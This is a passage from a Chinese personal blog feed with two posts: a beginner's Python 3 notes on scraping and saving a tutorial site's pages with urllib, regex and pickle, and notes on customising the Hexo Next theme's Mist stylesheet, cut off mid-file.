        <content type="html"><![CDATA[<p>暂时没有看<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431658427513eef3d9dd9f7c48599116735806328e81000" target="_blank" rel="noopener">廖雪峰的python3教程</a>，而是直接看了这个👉<a href="http://www.2cto.com/shouce/Pythonbbf/index.html" target="_blank" rel="noopener">笨办法学Python</a><br>笨办法学python - Learn Python The Hard Way 里面写的基本上是初级语法<br>看了一会儿发现这是针对无基础人士写的<strong>python2</strong>教程<br>看完之后就一个感觉：  </p><blockquote><p>python语法还是蛮简单的，但是swift还要简单一些  </p></blockquote><a id="more"></a><hr><h1 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h1><p>终极目标是写一个python脚本，用于抓取热点微博，并定时转发<br>看了一下<a href="http://open.weibo.com/wiki/微博API" target="_blank" rel="noopener">新浪微博api</a>，为了完成该目标就需要  </p><ol><li><a href="http://open.weibo.com/wiki/微博API" target="_blank" rel="noopener">转发一条微博信息</a></li><li><a href="http://open.weibo.com/wiki/2/statuses/update" target="_blank" rel="noopener">发布一条微博信息</a></li><li><a href="http://open.weibo.com/wiki/2/statuses/public_timeline" target="_blank" rel="noopener">获取最新的公共微博</a></li></ol><p>在深入的话还需要微博登录</p><hr><h1 id="step-by-step"><a href="#step-by-step" class="headerlink" title="step by step"></a>step by step</h1><p>api看不懂就看看demo<br>demo看不懂至少我看懂了post包里面需要什么数据<br>那么就直接开始尝试建立post或者get<br>还是不行，那么开始python抓取网页数据吧————这也是抓取热点微博的一个方法  </p><hr><h2 id="简单抓取网页数据"><a href="#简单抓取网页数据" class="headerlink" title="简单抓取网页数据"></a>简单抓取网页数据</h2><p>注意使用的是python3版本<br>不要用错了人家老版本的了 必须的urllib库变了：  </p><blockquote><p>python 3.x中urllib库和urilib2库合并成了urllib库<br>其中urllib2.urlopen()变成了urllib.request.urlopen()<br>urllib2.Request()变成了urllib.request.Request() </p></blockquote><p>参考了这两个网页<a href="http://blog.csdn.net/mr_tank_/article/details/14104103" target="_blank" rel="noopener">Python3 urllib GET方式获取数据</a>和<a href="http://wenku.baidu.com/link?url=d9Sxcd98Io4X8IYxx12J_YLBk7DPS2CFAlq-oUwzh8SByj90HMv3fTDCi4wgYpXjTR_luZDu7VzwbdHQ6k7aDHvl9bv2UyVmmqn9t2TX8R_" target="_blank" rel="noopener">python3.3 抓取网页数据</a>  </p><p>代码如下<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewn711zq9lj20cg0crgo5.jpg" alt="image"><br>我直接查询了一下我的微博的主页<br>本来写的是百度的，东西太多了看不过来。。。。。<br>网页的html数据就被储存在z_data当中，re库能够通过html的语法进行查询<br>第一个查询标题，第二个循环了查询链接<br>回显如下<br><img src="http://ww3.sinaimg.cn/large/a243ad6cjw1ewn7109tpqj20qj06qdik.jpg" alt="image"></p><hr><h1 id="更新2015-10-04-23-06-34"><a href="#更新2015-10-04-23-06-34" class="headerlink" title="更新2015-10-04 23:06:34"></a>更新2015-10-04 23:06:34</h1><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>是把网页中sidebar目录里的所有网页连接给装到一个 dic 字典当中<br>或者装到txt 文件当中，这样以后可以用脚本使用该 txt 文档<br>然后把文档里的所有东西都给拖下来<br>相当于是通过给出来的目录，下载整个网站<br>通过脚本可以吧<code>.html</code>文档简单的变成 markdown 文档</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>此次操作当中最重要的弄懂 python3 的正则表达式和目录操作<br>相关网页：  </p><blockquote><p><a href="http://python3.h.baike.com/article-362233.html" target="_blank" rel="noopener">re模块 正则表达式</a><br><a href="http://blog.csdn.net/jcjc918/article/details/9366011" target="_blank" rel="noopener">Python 3语法小记（四）字典 dictionary</a>  </p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">dic = &#123;<span class="string">'name'</span>:<span class="string">'urls'</span>&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">"the url u want"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = urllib.request.urlopen(url).read().decode(<span class="string">"UTF-8"</span>)</span><br><span class="line"></span><br><span class="line">urllib.request.urlopen(url).close()</span><br><span class="line"></span><br><span class="line">links = re.compile(<span class="string">'000"&gt;(.+?)&lt;/'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> urls <span class="keyword">in</span> links.findall(<span class="keyword">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"&lt;a"</span> <span class="keyword">in</span> urls:</span><br><span class="line">        pass</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        urls.replace(<span class="string">'/'</span>,<span class="string">'_'</span>)</span><br><span class="line">        dic[<span class="string">'%s'</span>%urls] = <span class="string">'-'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> names <span class="keyword">in</span> dic.keys():</span><br><span class="line"></span><br><span class="line">    temp = <span class="string">'href="(.+?)"&gt;'</span>+names</span><br><span class="line">    urlses = re.compile(temp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        urlname = urlses.findall(<span class="keyword">data</span>)[<span class="number">0</span>]</span><br><span class="line">    except:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    dic[names] = urlname</span><br><span class="line">    </span><br><span class="line">print(dic)</span><br></pre></td></tr></table></figure><p>关键在于两个正则表达式：<br><code>temp = &#39;href=&quot;(.+?)&quot;&gt;&#39;+names</code><br><code>links = re.compile(&#39;000&quot;&gt;(.+?)&lt;/&#39;)</code><br>这两个的构造是通过网页源代码来的，我想找的代码段是<code>(.+?)</code>里的内容<br>本来只用一个正则就行了的，但是整个网页当中有两段目录<br>于是 dic 显示一个名字<code>names</code>对应了两个<code>url</code><br>所以有了第二段 url 用于约束，也就是定位到 sidebar 当中  </p><h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><p>看图<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewpily64i4j20zk0m8b29.jpg" alt="image"><br>👆成功了哟👆<br>接下来的就是把<code>/wiki/</code>开头的相对路径添加成为含有网址的绝对路径<br><del>然后存为 txt  拿给其他的脚本使用了</del><br>更新：用<code>pickle</code>储存，见下方更新</p><hr><h1 id="更新2015-10-06-20-00-10"><a href="#更新2015-10-06-20-00-10" class="headerlink" title="更新2015-10-06 20:00:10"></a>更新2015-10-06 20:00:10</h1><h2 id="添加成绝对路径"><a href="#添加成绝对路径" class="headerlink" title="添加成绝对路径"></a>添加成绝对路径</h2><p>还是以<a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="noopener">廖雪峰的 python3 教程</a>为例<br>我们在上面已经得到了这样的url 字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/wiki/<span class="number">0014316089557264</span>a6b348958f449949df42a6d3a2e542c000</span><br></pre></td></tr></table></figure></p><p>这也是我们两行正则表达式的查找标准之一<br>在这里把url 改成绝对路径：<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlname = "<span class="link">http://www.liaoxuefeng.com"+urlses.findall(data)</span>[<span class="string">0</span>]</span><br></pre></td></tr></table></figure></p><h2 id="存档以便以后使用"><a href="#存档以便以后使用" class="headerlink" title="存档以便以后使用"></a>存档以便以后使用</h2><p>这里使用<code>pickle</code><br>参考网页：<a href="http://blog.csdn.net/mr_tank_/article/details/14224141" target="_blank" rel="noopener">Python3 pickle序列化</a><br>使用方法如下：<br><strong>👇写入👇</strong><br><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="keyword">open</span>(<span class="string">"the_name_you_want.pickle"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    pickle.dump(dic,f)</span><br></pre></td></tr></table></figure></p><p><strong>👇读出👇</strong><br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">'the_name_you_want.pickle'</span>,<span class="string">'rb'</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    dic=pickle.<span class="built_in">load</span>(f)</span><br></pre></td></tr></table></figure></p><p><strong>这里的<code>dic</code>是一个字典</strong></p><h2 id="用一个函数来生成-html-文档"><a href="#用一个函数来生成-html-文档" class="headerlink" title="用一个函数来生成 html 文档"></a>用一个函数来生成 html 文档</h2><p>输入一个<code>{names:url}</code>储存的字典，效果是把储存的所有网页都下载下来<br>一下就写好了，代码如下：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">def store_the_page(dic):</span><br><span class="line">    <span class="keyword">for</span> names in dic:</span><br><span class="line">        url = dic[names]</span><br><span class="line">        data=urllib.request.urlopen(url).<span class="keyword">read</span>()</span><br><span class="line">        urllib.request.urlopen(url).<span class="keyword">close</span>()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fp = <span class="keyword">open</span>(<span class="string">"%s.html"</span><span class="built_in">%names</span>,<span class="string">"wb"</span>)</span><br><span class="line">        except:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        fp.<span class="keyword">write</span>(data)</span><br><span class="line">        fp.<span class="keyword">close</span>()</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">"%s.html\t写入完成"</span><span class="built_in">%names</span>)</span><br></pre></td></tr></table></figure><p>两个<code>.py</code>怎么互相调用呢？  </p><blockquote><p>假如我有一个 <code>b.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">method</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>在<code>a.py</code>里就该这样调用：<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import b</span><br><span class="line"> blah</span><br><span class="line"> blah</span><br><span class="line"> blah</span><br><span class="line"><span class="function"><span class="keyword">method</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p></blockquote><p>也就是说，只用 import 就行了，因为在同一文件夹里，直接写<code>import b</code>  </p><h2 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h2><p>看图：<br><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1ewrpfh0mbsj20ff0lnjy0.jpg" alt="image"><br>看着文件一个一个生成还是蛮开心的<br>最后的错误是因为文件名中带有<code>/</code>这个特殊的符号<br>我们可以通过替换<code>names</code>字符串中的<code>/</code>来解决<br>或者是用<code>try</code> <code>except</code>来忽略它<br>看看 finder：<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ewrpk4u85lj211i0opdp5.jpg" alt="image"> </p><hr><p>至此就完成了查找目录-下载目录-下载网站的过程</p><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> abc </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>修改Next主题</title>
      <link href="/2015/10-04-theme-my-theme/"/>
      <url>/2015/10-04-theme-my-theme/</url>
      
        <content type="html"><![CDATA[<p>  开始尝试修改 hexo/themes/next 中的.styl文件，来更改主题甚至开发新主题。<br>  看到好多个一摸一样的主题了，好惨<br>  加加注释看看 .styl文件里面都是那些的定义，改改颜色，大小之类的，应该不难<br>  <a id="more"></a><br>  可以参考以下四个链接  </p><ol><li><a href="http://www.zipperary.com/2013/06/26/hexo-theme-alteration/" target="_blank" rel="noopener">hexo 主题优化</a>  </li><li><a href="http://www.jianshu.com/p/ed8e8cf1632c" target="_blank" rel="noopener">hexo博客主题更换</a>  </li><li><a href="http://www.tuicool.com/articles/eY3i2u3" target="_blank" rel="noopener">基于Pacman主题的Hexo修改</a>  </li><li><a href="http://www.huangyunkun.com/2014/03/18/hexo_ejs_template/" target="_blank" rel="noopener">Hexo模板系统和pacman的修改</a>   </li></ol><blockquote><p>突然发现sublime text这个工具相当好用，堪比notepad++<br>可以参考这一篇文章<a href="/2015/09/10/开始使用sublime-text-3/">开始使用sublime text 3</a>     </p></blockquote><hr><p>暂时就写这样，等18号下午考完计算机网络继续补，看会不会<strong>烂尾</strong>  </p><hr><p>2015年9月18日下午11:21更新<br>发现hexo/themes/next/languages/zh-Hans.yml 可以改一点东西<br>2015年10月04日上午01:14更新  </p><ol><li><a href="http://www.arao.me" target="_blank" rel="noopener">ARAO’S BLOG</a>  </li><li><a href="http://www.jianshu.com/p/70343b7c2fd3" target="_blank" rel="noopener">Hexo 主题 Light 修改教程</a></li><li><a href="http://blog.csdn.net/v123411739/article/details/45227249" target="_blank" rel="noopener">Concise，一款为hexo设计的简约而漂亮的主题</a></li></ol><hr><h1 id="更新2015年10月05日19-59-37"><a href="#更新2015年10月05日19-59-37" class="headerlink" title="更新2015年10月05日19:59:37"></a>更新2015年10月05日19:59:37</h1><p>next 默认的主题名为 <code>MIST</code> 这个的设置在这个地方：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/hexo/</span>themes<span class="regexp">/next/</span><span class="keyword">source</span><span class="regexp">/css/</span>_schemes<span class="regexp">/Mist/i</span>ndex.styl</span><br></pre></td></tr></table></figure></p><p>这里面包含了很多可见的属性<br>在学习 js 之前就先改改这个吧，我把我的注释写在下面<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Mist scheme </span></span><br><span class="line"><span class="comment">// gaoryrt changed</span></span><br><span class="line"><span class="comment">// =================================================</span></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.test</span> &#123; <span class="attribute">border</span>: <span class="number">10px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Tags</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">h1</span>, <span class="selector-tag">h2</span>, <span class="selector-tag">h3</span>, <span class="selector-tag">h4</span>, <span class="selector-tag">h5</span>, <span class="selector-tag">h6</span> &#123; <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">10px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正文的偏移</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">p</span> &#123; <span class="attribute">margin</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">20px</span> <span class="number">0px</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 链接下划线的颜色</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">a</span> &#123; <span class="attribute">border-bottom-color</span>: <span class="variable">$grey-light</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这个是分割线的设置</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">hr</span> &#123;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">2px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列表的样式(尚未尝试有可能不是这个)</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-tag">ul</span> <span class="selector-tag">li</span> &#123; <span class="attribute">list-style</span>: circle; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Components</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.btn</span> &#123;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">border-width</span>: <span class="number">2px</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.headband</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Header 头·顶栏</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.header</span> &#123; <span class="attribute">background</span>: <span class="variable">$white</span>; &#125;</span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">40px</span>;      <span class="comment">//与下方距离</span></span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">30px</span> <span class="number">0</span>;</span><br><span class="line">  clearfix();               <span class="comment">//清晰修正</span></span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">30px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 博客名</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.site-meta</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: left;</span><br><span class="line">  <span class="attribute">margin-left</span>: -<span class="number">10px</span>;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">10px</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.brand</span> &#123;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">1px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="variable">$black-deep</span>;</span><br><span class="line">    <span class="attribute">background</span>: none;</span><br><span class="line"></span><br><span class="line">    +mobile() &#123; <span class="attribute">display</span>: block; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.logo</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.site-title</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">22px</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: bolder;</span><br><span class="line"></span><br><span class="line">    +mobile() &#123; </span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">34px</span>; </span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">18px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 博客名字上下的两条线</span></span><br><span class="line"><span class="comment">// ------------------------------------------</span></span><br><span class="line"><span class="selector-class">.logo-line-before</span>,</span><br><span class="line"><span class="selector-class">.logo-line-after</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">i</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">0px</span>;                        <span class="comment">//这个改成0就没有上下两行了</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="variable">$black-deep</span>;</span><br><span class="line">    +mobile() &#123; <span class="attribute">height</span>: <span class="number">3px</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.use-motion</span> &#123;</span><br><span class="line">  <span class="selector-class">.logo-line-before</span> <span class="selector-tag">i</span> &#123; <span class="attribute">left</span>: -<span class="number">100%</span>; &#125;</span><br><span class="line">  <span class="selector-class">.logo-line-after</span> <span class="selector-tag">i</span> &#123; <span class="attribute">right</span>: -<span class="number">100%</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Menu  顶栏右边的导航</span></span><br><span class="line"><span class="comment">// --------------------------------------------------</span></span><br><span class="line"><span class="selector-class">.site-nav-toggle</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: static;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-class">.menu</span> &#123;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">8px</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">20px</span>;</span><br><span class="line"></span><br><span class="line">  +mobile() &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-tag">br</span> &#123; <span class="attribute">display</span>: none; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.menu-item</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">0</span>;</span><br><span class="line">    +mobile() &#123; <span class="attribute">display</span>: 